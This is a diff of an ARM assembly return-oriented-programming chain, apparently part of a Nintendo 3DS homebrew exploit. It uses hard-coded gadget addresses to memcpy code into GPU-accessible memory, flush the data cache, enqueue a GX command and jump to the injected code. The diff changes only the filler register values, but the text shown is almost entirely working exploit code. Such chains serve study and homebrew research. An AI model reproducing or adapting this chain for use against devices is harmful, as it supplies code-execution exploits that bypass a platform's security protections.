@@ -31,7 +31,7 @@ secondaryROP:
 		.word 0x001bbeb8 ; pop {r3, pc}
 			.word 0x002c9628 ; r3 (pop {r0, pc})
 		.word 0x00106eb8 ; pop {r4, lr} | bx r3
-			.word 0xDEADBABE ; r4 (garbage)
+			.word 0xDEADC0DE ; r4 (garbage)
 			.word 0x002c9628 ; lr (pop	{r0, pc})
 		;equivalent to .word 0x002c9628 ; pop {r0, pc}
 			.word CODELOCATIONGSP    ; r0 (dst)
@@ -39,8 +39,8 @@ secondaryROP:
 			.word CODELOCATIONVA ; r1 (src)
 		.word 0x0020b8e8 ; pop	{r2, r3, r4, pc}
 			.word codePatchEnd-codePatch ; r2 (size)
-			.word 0xDEADBABE ; r3 (garbage)
-			.word 0xDEADBABE ; r4 (garbage)
+			.word 0xDEADC0DE ; r3 (garbage)
+			.word 0xDEADC0DE ; r4 (garbage)
 		.word 0x00224FB0 ; memcpy (ends in BX	LR)
 
 	;flush data cache
@@ -51,11 +51,11 @@ secondaryROP:
 		.word 0x0020b8e8 ; pop	{r2, r3, r4, pc}
 			.word CODELOCATIONGSP  ; r2 (address)
 			.word codePatchEnd-codePatch ; r3 (size)
-			.word 0xDEADBABE ; r4 (garbage)
+			.word 0xDEADC0DE ; r4 (garbage)
 		.word 0x002D15D8 ; GSPGPU_FlushDataCache (ends in LDMFD   SP!, {R4-R6,PC})
-			.word 0xDEADBABE ; r4 (garbage)
-			.word 0xDEADBABE ; r5 (garbage)
-			.word 0xDEADBABE ; r6 (garbage)
+			.word 0xDEADC0DE ; r4 (garbage)
+			.word 0xDEADC0DE ; r5 (garbage)
+			.word 0xDEADC0DE ; r6 (garbage)
 
 	;send GX command
 		.word 0x002c9628 ; pop	{r0, pc}
@@ -63,18 +63,18 @@ secondaryROP:
 		.word 0x00226734 ; pop	{r1, pc}
 			.word PAYLOADADR+gxCommand-ROP ; r1 (cmd addr)
 		.word 0x001C2B58 ; nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue (ends in LDMFD   SP!, {R4-R8,PC})
-			.word 0xDEADBABE ; r4 (garbage)
-			.word 0xDEADBABE ; r5 (garbage)
-			.word 0xDEADBABE ; r6 (garbage)
-			.word 0xDEADBABE ; r7 (garbage)
-			.word 0xDEADBABE ; r8 (garbage)
+			.word 0xDEADC0DE ; r4 (garbage)
+			.word 0xDEADC0DE ; r5 (garbage)
+			.word 0xDEADC0DE ; r6 (garbage)
+			.word 0xDEADC0DE ; r7 (garbage)
+			.word 0xDEADC0DE ; r8 (garbage)
 
 
 	;sleep for a second and jump to code
 		.word 0x00226734 ; pop {r3, pc}
 			.word 0x002c9628 ; r1 (pop {r0, pc})
 		.word 0x0012ec64 ; pop {r4, lr} | bx r1
-			.word 0xDEADBABE ; r4 (garbage)
+			.word 0xDEADC0DE ; r4 (garbage)
 			; .word 0x00100000 ; lr (code addr)
 			.word 0x002c9628 ; lr (pop {r0, pc})
 		;equivalent to .word 0x002c9628 ; pop {r0, pc}
